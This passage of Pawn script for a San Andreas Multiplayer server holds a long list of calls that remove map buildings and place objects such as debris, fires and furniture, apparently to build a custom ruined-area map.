		RemoveBuildingForPlayer(playerid, 6058, 836.5391, -1427.9688, 16.2578, 0.25);
		RemoveBuildingForPlayer(playerid, 621, 829.0391, -1417.9297, 11.6953, 0.25);
		RemoveBuildingForPlayer(playerid, 621, 835.8594, -1417.9297, 11.6953, 0.25);
		RemoveBuildingForPlayer(playerid, 6057, 885.9375, -1426.8750, 16.7188, 0.25);
		RemoveBuildingForPlayer(playerid, 621, 899.6797, -1417.7578, 11.6328, 0.25);
		RemoveBuildingForPlayer(playerid, 5926, 816.3359, -1217.1484, 26.4453, 0.25);
		RemoveBuildingForPlayer(playerid, 5934, 1076.7109, -1358.0938, 15.4453, 0.25);
		RemoveBuildingForPlayer(playerid, 5965, 887.9766, -1372.4063, 18.1719, 0.25);
		RemoveBuildingForPlayer(playerid, 6003, 954.6875, -1305.7734, 30.1406, 0.25);
		RemoveBuildingForPlayer(playerid, 6005, 895.2578, -1256.9297, 31.2344, 0.25);
		RemoveBuildingForPlayer(playerid, 3685, 1183.6250, -1257.8750, 17.3281, 0.25);
		RemoveBuildingForPlayer(playerid, 1266, 907.7656, -1374.6484, 28.1641, 0.25);
		RemoveBuildingForPlayer(playerid, 1266, 875.0469, -1383.4766, 28.1641, 0.25);
		RemoveBuildingForPlayer(playerid, 1297, 901.7578, -1389.8672, 15.6719, 0.25);
		RemoveBuildingForPlayer(playerid, 716, 876.4219, -1389.3359, 12.2891, 0.25);
		RemoveBuildingForPlayer(playerid, 1260, 875.0469, -1383.4766, 28.1641, 0.25);
		RemoveBuildingForPlayer(playerid, 5780, 889.1094, -1375.6641, 18.8516, 0.25);
		RemoveBuildingForPlayer(playerid, 5781, 887.9766, -1372.4063, 18.1719, 0.25);
		RemoveBuildingForPlayer(playerid, 716, 896.5625, -1389.3359, 12.2891, 0.25);
		RemoveBuildingForPlayer(playerid, 1260, 907.7656, -1374.6484, 28.1641, 0.25);
		RemoveBuildingForPlayer(playerid, 1297, 792.0859, -1358.1172, 15.3672, 0.25);
		RemoveBuildingForPlayer(playerid, 1297, 813.3359, -1331.8828, 15.6406, 0.25);
		RemoveBuildingForPlayer(playerid, 962, 827.5078, -1353.7266, 13.6016, 0.25);
		RemoveBuildingForPlayer(playerid, 5816, 877.3516, -1363.7109, 21.1563, 0.25);
		RemoveBuildingForPlayer(playerid, 1283, 791.8047, -1326.7734, 15.4922, 0.25);
		RemoveBuildingForPlayer(playerid, 1283, 807.9766, -1319.6563, 15.5469, 0.25);
		RemoveBuildingForPlayer(playerid, 1297, 802.0391, -1307.6797, 15.8594, 0.25);
		RemoveBuildingForPlayer(playerid, 1283, 796.8203, -1309.5469, 15.4609, 0.25);
		RemoveBuildingForPlayer(playerid, 1297, 817.8750, -1314.9766, 15.6406, 0.25);
		RemoveBuildingForPlayer(playerid, 1297, 792.7422, -1227.0391, 16.9688, 0.25);
		RemoveBuildingForPlayer(playerid, 5836, 816.3359, -1217.1484, 26.4453, 0.25);
		RemoveBuildingForPlayer(playerid, 5838, 895.2578, -1256.9297, 31.2344, 0.25);
		RemoveBuildingForPlayer(playerid, 5731, 1076.7109, -1358.0938, 15.4453, 0.25);
		RemoveBuildingForPlayer(playerid, 5818, 954.6875, -1305.7734, 30.1406, 0.25);
		RemoveBuildingForPlayer(playerid, 5811, 1131.1953, -1380.4219, 17.0703, 0.25);
		RemoveBuildingForPlayer(playerid, 620, 1240.9219, -1356.5547, 12.2969, 0.25);
		RemoveBuildingForPlayer(playerid, 3684, 1183.6250, -1257.8750, 17.3281, 0.25);
		RemoveBuildingForPlayer(playerid, 1388, 1238.3750, -1258.2813, 57.2031, 0.25);
		RemoveBuildingForPlayer(playerid, 1391, 1238.3750, -1258.2734, 44.6641, 0.25);
		RemoveBuildingForPlayer(playerid, 1312, 1307.6172, -1394.4766, 16.5000, 0.25);
		RemoveBuildingForPlayer(playerid, 620, 1329.4766, -1374.4297, 12.5859, 0.25);
		RemoveBuildingForPlayer(playerid, 1283, 1332.0859, -1406.4063, 15.6875, 0.25);
		RemoveBuildingForPlayer(playerid, 1283, 1342.0000, -1384.6563, 15.7109, 0.25);
		RemoveBuildingForPlayer(playerid, 620, 760.4531, -1304.1328, 12.2813, 0.25);
		CreatePlayerObject(playerid,5838, 891.97449, -1266.09656, 20.24906,   47.00000, 0.00000, 360.00000);
		CreatePlayerObject(playerid,1297, 812.10632, -1332.17236, 15.64060,   338.00000, 0.00000, -40.00000);
		CreatePlayerObject(playerid,1283, 808.74261, -1320.18945, 14.09340,   4.00000, -16.00000, 98.00000);
		CreatePlayerObject(playerid,1297, 819.47150, -1318.54663, 12.50520,   90.00000, -55.00000, 90.00000);
		CreatePlayerObject(playerid,962, 827.12695, -1353.34436, 12.49799,   1.57080, 0.00000, -1.57080);
		CreatePlayerObject(playerid,16077, 813.25470, -1313.83521, 11.87587,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,16317, 809.39984, -1355.29553, 11.31832,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,1283, 796.83539, -1309.72510, 12.65880,   85.00000, -17.00000, 178.00000);
		CreatePlayerObject(playerid,1297, 802.17352, -1307.94434, 15.35740,   33.00000, 4.00000, -47.00000);
		CreatePlayerObject(playerid,3364, 791.12500, -1331.16370, 11.02700,   11.00000, 4.00000, 222.00000);
		CreatePlayerObject(playerid,2676, 823.61682, -1334.88794, 12.67340,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,2676, 811.34113, -1341.38098, 12.67340,   0.00000, 0.00000, 84.00000);
		CreatePlayerObject(playerid,2676, 817.79382, -1327.28369, 12.67340,   0.00000, 0.00000, 207.00000);
		CreatePlayerObject(playerid,2676, 803.15076, -1330.36682, 12.67340,   0.00000, 0.00000, 142.00000);
		CreatePlayerObject(playerid,2676, 796.05078, -1345.18115, 12.67340,   0.00000, 0.00000, 69.00000);
		CreatePlayerObject(playerid,849, 839.56067, -1339.43835, 6.57764,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,853, 836.94989, -1340.95203, 6.57879,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,926, 837.86279, -1341.49634, 6.44554,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,1358, 796.59723, -1360.94226, 13.70190,   0.00000, 0.00000, 142.00000);
		CreatePlayerObject(playerid,1297, 794.32971, -1357.77161, 13.31606,   357.00000, -69.00000, 142.00000);
		CreatePlayerObject(playerid,2672, 816.05603, -1339.66614, 12.84180,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,2672, 814.44794, -1328.70996, 12.84180,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,2672, 831.78760, -1319.95630, 12.84180,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,2672, 829.34930, -1328.82556, 12.84180,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,2672, 841.50336, -1327.71350, 12.84180,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,2676, 832.15601, -1325.71021, 12.67340,   0.00000, 0.00000, 207.00000);
		CreatePlayerObject(playerid,2676, 852.11017, -1320.10278, 12.67340,   0.00000, 0.00000, 207.00000);
		CreatePlayerObject(playerid,2676, 795.50061, -1315.55493, 12.67340,   0.00000, 0.00000, 207.00000);
		CreatePlayerObject(playerid,2672, 793.86078, -1323.04956, 12.84180,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,1440, 823.90918, -1311.42993, 13.04385,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,18249, 805.31128, -1390.73950, 8.65250,   0.00000, 0.00000, 328.84305);
		CreatePlayerObject(playerid,620, 772.91711, -1301.83020, 11.77930,   47.00000, 55.00000, -40.00000);
		CreatePlayerObject(playerid,3594, 840.68347, -1319.85901, 12.76630,   0.00000, 0.00000, -40.00000);
		CreatePlayerObject(playerid,3594, 834.84259, -1333.61060, 12.76630,   0.00000, 0.00000, 47.00000);
		CreatePlayerObject(playerid,3594, 792.36835, -1372.78503, 12.76630,   0.00000, 0.00000, 47.00000);
		CreatePlayerObject(playerid,619, 785.56458, -1286.94177, 11.97320,   0.00000, 0.00000, 113.00000);
		CreatePlayerObject(playerid,6959, 887.16516, -1364.57947, 12.53743,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,5816, 877.63971, -1364.43811, 16.41507,   33.00000, 4.00000, 25.00000);
		CreatePlayerObject(playerid,3866, 892.25861, -1373.25012, 11.81726,   18.00000, 18.00000, 180.00000);
		CreatePlayerObject(playerid,3866, 893.93304, -1373.23120, 11.81730,   18.00000, 18.00000, 360.00000);
		CreatePlayerObject(playerid,10984, 898.70905, -1370.90979, 13.58072,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 906.05859, -1383.52515, 13.37365,   0.00000, 0.00000, -31.00000);
		CreatePlayerObject(playerid,1260, 879.10809, -1380.62402, 19.25948,   3.00000, 49.00000, 29.00000);
		CreatePlayerObject(playerid,716, 876.76642, -1389.25244, 12.28910,   357.00000, 76.00000, -62.00000);
		CreatePlayerObject(playerid,716, 896.83282, -1388.80762, 12.08910,   357.00000, 18.00000, 84.00000);
		CreatePlayerObject(playerid,6959, 885.05151, -1416.99438, 11.52706,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,3887, 880.60126, -1425.18005, 11.32756,   4.00000, 11.00000, -90.00000);
		CreatePlayerObject(playerid,10984, 910.88287, -1426.38904, 13.11837,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,3887, 892.75018, -1426.53003, 8.95599,   4.00000, 11.00000, 90.00000);
		CreatePlayerObject(playerid,10984, 874.16809, -1418.10840, 13.11837,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,6959, 856.23309, -1417.22290, 11.52706,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,6959, 827.27191, -1418.01477, 11.52706,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,3887, 834.83484, -1424.74854, 15.43436,   0.00000, -18.00000, -90.00000);
		CreatePlayerObject(playerid,3887, 835.07898, -1424.97632, 12.73705,   4.00000, 18.00000, 91.00000);
		CreatePlayerObject(playerid,10984, 814.01440, -1422.44568, 13.52646,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 859.72882, -1431.47424, 13.52650,   0.00000, 0.00000, -25.00000);
		CreatePlayerObject(playerid,10984, 826.70154, -1435.10461, 13.52650,   0.00000, 0.00000, -25.00000);
		CreatePlayerObject(playerid,10984, 887.56146, -1433.04285, 13.52650,   0.00000, 0.00000, -25.00000);
		CreatePlayerObject(playerid,10984, 839.39301, -1413.52917, 13.11840,   0.00000, 0.00000, 76.00000);
		CreatePlayerObject(playerid,10984, 863.43719, -1413.27039, 13.11840,   0.00000, 0.00000, 76.00000);
		CreatePlayerObject(playerid,621, 812.81158, -1417.80896, 10.93713,   357.00000, -40.00000, 149.00000);
		CreatePlayerObject(playerid,6151, 1007.27496, -1435.27173, 9.32853,   357.00000, 15.00000, 0.00000);
		CreatePlayerObject(playerid,6959, 1029.27673, -1435.88721, 12.53168,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,3887, 1043.29175, -1429.22302, 9.37927,   22.00000, 0.00000, 180.00000);
		CreatePlayerObject(playerid,3887, 1025.50464, -1425.06677, 13.59191,   -4.00000, 25.00000, -89.00000);
		CreatePlayerObject(playerid,3887, 1020.78589, -1439.60889, 13.59190,   -4.00000, 25.00000, 55.00000);
		CreatePlayerObject(playerid,10984, 1051.30640, -1415.93713, 12.75872,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1040.39722, -1428.43054, 12.75872,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1024.33289, -1429.90027, 12.75872,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1040.18091, -1456.74792, 13.70494,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 963.83972, -1427.32129, 13.70490,   0.00000, 0.00000, 149.00000);
		CreatePlayerObject(playerid,10984, 973.87878, -1440.15796, 13.40290,   0.00000, 0.00000, 331.00000);
		CreatePlayerObject(playerid,10984, 998.08771, -1437.14258, 13.40290,   0.00000, 0.00000, 251.00000);
		CreatePlayerObject(playerid,10984, 1040.49402, -1440.61646, 12.75872,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1030.62744, -1436.60242, 12.75872,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,1307, 1040.39063, -1414.50549, 12.36720,   357.00000, 33.00000, 76.00000);
		CreatePlayerObject(playerid,6959, 1093.24255, -1365.38293, 12.76739,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,3887, 1079.79077, -1356.75281, 13.61454,   -4.00000, 33.00000, 359.89999);
		CreatePlayerObject(playerid,10984, 1083.47852, -1336.55591, 12.58920,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1074.95337, -1384.23901, 12.72988,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,6099, 1216.98523, -1449.65808, 5.97860,   345.00000, 11.00000, 0.00000);
		CreatePlayerObject(playerid,3866, 1226.65417, -1422.22949, 8.31520,   18.00000, 11.00000, -69.00000);
		CreatePlayerObject(playerid,3866, 1164.97656, -1421.48730, 4.28060,   18.00000, 47.00000, -62.00000);
		CreatePlayerObject(playerid,3866, 1210.38647, -1417.07520, 3.80060,   18.00000, 47.00000, -25.00000);
		CreatePlayerObject(playerid,10984, 1220.15271, -1410.17163, 12.78057,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1207.52686, -1407.49121, 12.78057,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1197.95947, -1411.51538, 12.78057,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1233.12097, -1420.66870, 12.78057,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1233.11401, -1408.24487, 12.78057,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,3866, 1077.40137, -1382.42175, 8.19346,   35.00000, 25.00000, 121.00000);
		CreatePlayerObject(playerid,3866, 1084.61389, -1385.26868, 4.66759,   35.00000, 25.00000, 287.10001);
		CreatePlayerObject(playerid,5811, 1131.84082, -1383.89832, 16.13340,   357.00000, -33.00000, 62.00000);
		CreatePlayerObject(playerid,615, 1109.83960, -1417.13953, 11.62918,   3.00000, 62.00000, 41.00000);
		CreatePlayerObject(playerid,10984, 1078.66626, -1393.14111, 13.38330,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1088.46606, -1371.22144, 13.38330,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1110.56726, -1365.50305, 13.38330,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1231.35010, -1428.97083, 12.78057,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,615, 1146.51428, -1417.49670, 12.06563,   357.00000, -69.00000, -2.00000);
		CreatePlayerObject(playerid,10984, 1158.38074, -1415.81506, 12.78057,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1167.63647, -1410.17981, 12.78057,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,1391, 1236.19592, -1266.27661, 40.29452,   18.00000, -4.00000, 3.00000);
		CreatePlayerObject(playerid,1388, 1218.07349, -1281.23401, 13.66354,   0.00000, 98.00000, 135.00000);
		CreatePlayerObject(playerid,3684, 1182.98560, -1257.64526, 13.69567,   10.00000, 11.00000, 84.00000);
		CreatePlayerObject(playerid,3866, 1187.99792, -1259.99060, 11.95707,   0.00000, 12.00000, 164.00000);
		CreatePlayerObject(playerid,10984, 1182.63098, -1264.78992, 13.46266,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1194.80115, -1270.01904, 13.14747,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1199.23669, -1255.94861, 14.99624,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1203.59814, -1291.44141, 12.05926,   0.00000, 0.00000, 0.20100);
		CreatePlayerObject(playerid,10984, 1170.35950, -1385.00879, 12.78057,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,1312, 1307.29578, -1394.47424, 13.32329,   90.00000, 0.00000, -91.00000);
		CreatePlayerObject(playerid,1283, 1331.99170, -1406.37292, 14.28143,   357.00000, -13.00000, -91.00000);
		CreatePlayerObject(playerid,5995, 1300.94373, -1401.73315, 12.07989,   -4.00000, -2.00000, 360.00000);
		CreatePlayerObject(playerid,10984, 1356.63025, -1418.61267, 13.38199,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1357.52747, -1394.29871, 13.38199,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1342.66272, -1424.12646, 13.38200,   0.00000, 0.00000, -98.00000);
		CreatePlayerObject(playerid,10984, 1345.43494, -1416.73169, 14.17700,   0.00000, 0.00000, -47.00000);
		CreatePlayerObject(playerid,1312, 1343.92554, -1425.61304, 13.84030,   295.00000, 4.00000, 4.00000);
		CreatePlayerObject(playerid,10984, 1330.73401, -1414.61499, 14.17700,   0.00000, 0.00000, -47.00000);
		CreatePlayerObject(playerid,10984, 1351.63977, -1388.23706, 13.38200,   0.00000, 0.00000, 91.00000);
		CreatePlayerObject(playerid,10984, 1341.55164, -1387.79834, 12.29330,   0.00000, 0.00000, 91.00000);
		CreatePlayerObject(playerid,1283, 1341.99548, -1384.45935, 15.71090,   3.00000, 33.00000, -193.00000);
		CreatePlayerObject(playerid,10984, 1356.40015, -1408.20190, 13.38199,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,5995, 1344.45984, -1400.16760, 9.47490,   4.00000, 4.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1299.66650, -1385.11938, 13.20335,   0.00000, 0.00000, 91.00000);
		CreatePlayerObject(playerid,10984, 1334.17786, -1371.52917, 12.79731,   0.00000, 0.00000, 91.00000);
		CreatePlayerObject(playerid,10984, 1287.30273, -1385.33594, 13.24139,   0.00000, 0.00000, 91.00000);
		CreatePlayerObject(playerid,10984, 1293.35767, -1385.03845, 13.85149,   0.00000, 0.00000, 91.00000);
		CreatePlayerObject(playerid,10984, 1284.45410, -1395.33447, 13.24140,   0.00000, 0.00000, -178.00000);
		CreatePlayerObject(playerid,10984, 1287.32056, -1409.13171, 13.24140,   0.00000, 0.00000, -178.00000);
		CreatePlayerObject(playerid,3866, 1293.96863, -1360.91333, 7.39127,   0.00000, 35.00000, 76.00000);
		CreatePlayerObject(playerid,10984, 1285.85864, -1364.96851, 13.24139,   0.00000, 0.00000, 91.00000);
		CreatePlayerObject(playerid,10984, 1299.87451, -1371.04529, 13.24139,   0.00000, 0.00000, 91.00000);
		CreatePlayerObject(playerid,10984, 1296.37866, -1419.82678, 13.24140,   0.00000, 0.00000, -178.00000);
		CreatePlayerObject(playerid,3866, 1311.12610, -1414.78870, 5.21870,   -4.00000, 47.00000, -84.00000);
		CreatePlayerObject(playerid,10984, 1319.47388, -1418.11353, 14.31932,   0.00000, 0.00000, -178.00000);
		CreatePlayerObject(playerid,10984, 1305.25146, -1416.30298, 14.31932,   0.00000, 0.00000, -178.00000);
		CreatePlayerObject(playerid,3866, 1312.44495, -1467.51123, 8.31520,   18.00000, 11.00000, -69.00000);
		CreatePlayerObject(playerid,10984, 1323.62512, -1452.81677, 12.84963,   0.00000, 0.00000, -47.00000);
		CreatePlayerObject(playerid,620, 1327.19946, -1379.33801, 12.53690,   357.00000, -70.00000, -236.00000);
		CreatePlayerObject(playerid,1267, 1409.41431, -1399.56116, 16.97202,   -62.00000, -309.00000, 47.00000);
		CreatePlayerObject(playerid,3866, 1383.63452, -1426.63855, 15.12452,   18.00000, 4.00000, 298.93686);
		CreatePlayerObject(playerid,10984, 1394.25012, -1430.79163, 13.38199,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1386.57898, -1415.32153, 13.38199,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1263.23730, -1382.40186, 12.78057,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,620, 1240.64709, -1356.36316, 11.18280,   3.00000, 76.00000, 207.00000);
		CreatePlayerObject(playerid,4113, 1345.30481, -1553.00916, 18.24464,   356.85840, 0.00000, 3.14159);
		CreatePlayerObject(playerid,4113, 1340.05823, -1554.07275, 51.69569,   357.00000, -20.00000, 0.00000);
		CreatePlayerObject(playerid,3866, 1342.40576, -1514.93018, 10.12648,   0.00000, 19.00000, -6.00000);
		CreatePlayerObject(playerid,10984, 1342.95496, -1503.22473, 12.37392,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1330.60791, -1522.25659, 12.37392,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,3866, 1371.24146, -1466.28870, 10.12648,   0.00000, 19.00000, -6.00000);
		CreatePlayerObject(playerid,10984, 1357.52515, -1471.70313, 12.37390,   0.00000, 0.00000, 142.00000);
		CreatePlayerObject(playerid,10984, 1363.21619, -1454.59802, 12.37390,   0.00000, 0.00000, 142.00000);
		CreatePlayerObject(playerid,1290, 1344.31543, -1447.63269, 17.21891,   357.00000, 33.00000, -193.00000);
		CreatePlayerObject(playerid,1290, 1340.67920, -1481.02905, 14.85815,   357.00000, 55.00000, -98.00000);
		CreatePlayerObject(playerid,0, 1198.10461, -1388.72144, 13.23150,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1089.80676, -1386.06714, 12.93478,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,4117, 1375.37195, -1453.49768, 15.38855,   11.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,4114, 1349.82031, -1511.00598, 14.46660,   -18.00000, 0.00000, 3.00000);
		CreatePlayerObject(playerid,10984, 1352.86816, -1491.92737, 12.37392,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,620, 1305.44507, -1576.68127, 12.48490,   302.00000, 280.00000, -3.00000);
		CreatePlayerObject(playerid,3866, 1301.82336, -1873.34790, 10.60844,   31.00000, -18.00000, 347.00000);
		CreatePlayerObject(playerid,10984, 1291.18140, -1863.12036, 12.53941,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1304.25476, -1864.78735, 12.53941,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 1294.26636, -1868.20605, 12.53941,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,5836, 795.91473, -1221.10693, 17.94770,   105.00000, 0.00000, -40.00000);
		CreatePlayerObject(playerid,3594, 900.09961, -1389.99170, 12.56700,   0.00000, 0.00000, -65.00000);
		CreatePlayerObject(playerid,3594, 870.84363, -1408.89832, 12.13665,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,3594, 853.51324, -1409.89380, 12.53770,   0.00000, 0.00000, 105.00000);
		CreatePlayerObject(playerid,3594, 844.32251, -1395.90210, 12.53770,   0.00000, 0.00000, -55.00000);
		CreatePlayerObject(playerid,3594, 839.73523, -1398.56421, 12.53770,   0.00000, 0.00000, -127.00000);
		CreatePlayerObject(playerid,3594, 813.45520, -1412.57642, 12.53770,   0.00000, 0.00000, -62.00000);
		CreatePlayerObject(playerid,3594, 1076.42969, -1405.05811, 12.83140,   0.00000, 0.00000, 76.00000);
		CreatePlayerObject(playerid,3594, 1082.76990, -1403.09216, 12.83140,   0.00000, 0.00000, -62.00000);
		CreatePlayerObject(playerid,3594, 1079.63635, -1399.79907, 12.83140,   0.00000, 0.00000, -40.00000);
		CreatePlayerObject(playerid,3594, 1280.29077, -1412.82227, 12.58978,   0.00000, 0.00000, 98.00000);
		CreatePlayerObject(playerid,3594, 1280.78381, -1403.32532, 13.09785,   -12.00000, 0.00000, 98.00000);
		CreatePlayerObject(playerid,3594, 1277.77747, -1392.86804, 12.02457,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 794.05524, -1328.50159, 11.74841,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,3243, 853.02869, -1384.53284, -1.55100,   0.00000, 0.00000, 101.00000);
		CreatePlayerObject(playerid,0, 851.90350, -1390.65662, -1.55100,   0.00000, 0.00000, 33.00000);
		CreatePlayerObject(playerid,3243, 847.96069, -1379.11755, -1.55100,   0.00000, 0.00000, 164.00000);
		CreatePlayerObject(playerid,3243, 841.97748, -1373.55054, -1.55100,   0.00000, 0.00000, 105.00000);
		CreatePlayerObject(playerid,1362, 846.75043, -1385.72009, -1.00526,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,3525, 846.73767, -1385.69275, -1.66000,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,3243, 837.51819, -1369.41882, -1.55100,   0.00000, 0.00000, 171.00000);
		CreatePlayerObject(playerid,1571, 831.13428, -1362.95789, -0.19180,   0.00000, 0.00000, -45.00000);
		CreatePlayerObject(playerid,3243, 809.61127, -1343.98718, -1.51520,   0.00000, 0.00000, 120.00000);
		CreatePlayerObject(playerid,3243, 804.44861, -1340.15845, -1.51520,   0.00000, 0.00000, 164.00000);
		CreatePlayerObject(playerid,3243, 799.18707, -1343.82458, -1.51520,   0.00000, 0.00000, 244.00000);
		CreatePlayerObject(playerid,10984, 785.46094, -1323.80688, 0.61451,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,10984, 782.83661, -1334.24744, -1.38774,   0.00000, 0.00000, -55.00000);
		CreatePlayerObject(playerid,10984, 788.40802, -1328.22974, -0.60978,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,1362, 835.21228, -1375.75818, -1.00526,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,3525, 835.20026, -1375.73987, -1.66000,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,1362, 804.60992, -1346.05835, -1.00526,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,3525, 804.61517, -1346.02808, -1.65170,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,1362, 814.11926, -1357.01086, -1.00526,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,3525, 814.05103, -1356.94763, -1.65000,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,1362, 822.90552, -1365.29785, -1.00526,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,3525, 822.79785, -1365.29614, -1.65480,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,3243, 851.47284, -1390.40967, -1.55100,   0.00000, 0.00000, 40.00000);
		CreatePlayerObject(playerid,1256, 845.35297, -1387.16321, -0.86890,   0.00000, 0.00000, 229.00000);
		CreatePlayerObject(playerid,1810, 847.03345, -1384.19202, -1.51181,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,1810, 845.78955, -1384.73218, -1.51180,   0.00000, 0.00000, 47.00000);
		CreatePlayerObject(playerid,1810, 849.62732, -1382.76050, -1.51180,   0.00000, 90.00000, -47.00000);
		CreatePlayerObject(playerid,1810, 849.34796, -1382.64490, -1.51180,   0.00000, 0.00000, -84.00000);
		CreatePlayerObject(playerid,2812, 849.37927, -1383.23682, -1.51126,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,1712, 849.06604, -1385.86340, -1.51110,   0.00000, 0.00000, -113.00000);
		CreatePlayerObject(playerid,1256, 834.33087, -1377.78003, -0.86890,   0.00000, 0.00000, 244.00000);
		CreatePlayerObject(playerid,1810, 836.94946, -1376.11438, -1.51060,   0.00000, 0.00000, -105.00000);
		CreatePlayerObject(playerid,1810, 836.10626, -1377.31628, -1.51060,   0.00000, 0.00000, -171.00000);
		CreatePlayerObject(playerid,1764, 832.93036, -1375.17249, -1.51060,   0.00000, 0.00000, 46.00000);
		CreatePlayerObject(playerid,1760, 822.24487, -1353.44458, -1.51080,   0.00000, 0.00000, -45.00000);
		CreatePlayerObject(playerid,1761, 819.26733, -1355.39722, -1.51140,   0.00000, 0.00000, 62.00000);
		CreatePlayerObject(playerid,1757, 823.70776, -1356.83423, -1.51060,   0.00000, 0.00000, 207.00000);
		CreatePlayerObject(playerid,1810, 821.45459, -1352.90100, -1.51129,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,1810, 824.43323, -1356.18652, -1.51130,   0.00000, 0.00000, -98.00000);
		CreatePlayerObject(playerid,1810, 819.53943, -1356.15967, -1.51130,   0.00000, 0.00000, -258.00000);
		CreatePlayerObject(playerid,1810, 816.16980, -1348.45056, -1.51129,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,1810, 816.79803, -1348.94482, -1.51130,   0.00000, 0.00000, -55.00000);
		CreatePlayerObject(playerid,1810, 817.11517, -1349.85547, -1.51130,   0.00000, 0.00000, -84.00000);
		CreatePlayerObject(playerid,924, 812.15002, -1357.49243, -1.32930,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,849, 811.29242, -1356.78162, -1.23120,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,1338, 810.18494, -1355.75989, -1.51248,   0.00000, 0.00000, 0.00000);
		CreatePlayerObject(playerid,1763, 803.34772, -1347.92346, -1.51110,   0.00000, 0.00000, 120.00000);
		CreatePlayerObject(playerid,1810, 803.70728, -1344.28772, -1.51240,   0.00000, 0.00000, 33.00000);
		CreatePlayerObject(playerid,1810, 805.78967, -1344.99719, -1.51240,   0.00000, 0.00000, -33.00000);
